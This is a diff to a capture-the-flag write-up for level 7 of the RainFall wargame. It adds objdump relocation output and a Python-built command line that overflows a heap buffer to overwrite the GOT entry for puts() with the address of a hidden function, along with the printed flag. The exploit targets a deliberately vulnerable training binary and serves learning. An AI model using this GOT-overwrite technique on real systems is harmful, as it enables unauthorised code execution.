@@ -94,4 +94,28 @@ Breakpoint 2, 0x080485bd in main ()
 0xbffff700:	0x00000000	0xb2243554	0x8560b144	0x00000000
 0xbffff710:	0x00000000	0x00000000
 ```
-As we can see passing 'A' * 21 we overwrote by `one byte` the __address__ *0x08040041* so we know our *offset is 20*, build the *payload*<br>
+As we can see passing 'A' * 21 we overwrote by `one byte` the __address__ *0x08040041* so we know our *offset is 20*, we already have the `m()` function __address__ above and the *offset* now find the `puts()` __address__ and  build the *payload*
+```
+level7@RainFall:~$ objdump -R level7
+
+level7:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+08049904 R_386_GLOB_DAT    __gmon_start__
+08049914 R_386_JUMP_SLOT   printf
+08049918 R_386_JUMP_SLOT   fgets
+0804991c R_386_JUMP_SLOT   time
+08049920 R_386_JUMP_SLOT   strcpy
+08049924 R_386_JUMP_SLOT   malloc
+08049928 R_386_JUMP_SLOT   puts
+0804992c R_386_JUMP_SLOT   __gmon_start__
+08049930 R_386_JUMP_SLOT   __libc_start_main
+08049934 R_386_JUMP_SLOT   fopen
+```
+
+```
+./level7 $(python -c "print 'A' * 20 + '\x28\x99\x04\x08'") $(python -c "print  '\xf4\x84\x04\x08'")
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+ - 1602709985
+```
